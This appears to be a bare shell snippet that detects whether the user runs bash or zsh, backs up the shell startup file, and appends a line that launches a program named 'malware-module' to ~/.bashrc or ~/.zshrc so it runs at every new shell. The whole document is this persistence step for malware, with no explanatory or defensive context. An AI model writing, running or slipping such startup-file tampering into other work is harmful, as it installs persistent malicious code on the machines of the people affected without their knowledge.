if [ -n "$BASH_VERSION" ]; then
  cp ~/.bashrc ~/.bashrc.bak
  echo "./malware-module" >> ~/.bashrc
elif [ -n "$ZSH_VERSION" ]; then
  cp ~/.zshrc ~/.zshrc.bak
  echo "./malware-module" >> ~/.zshrc
fi

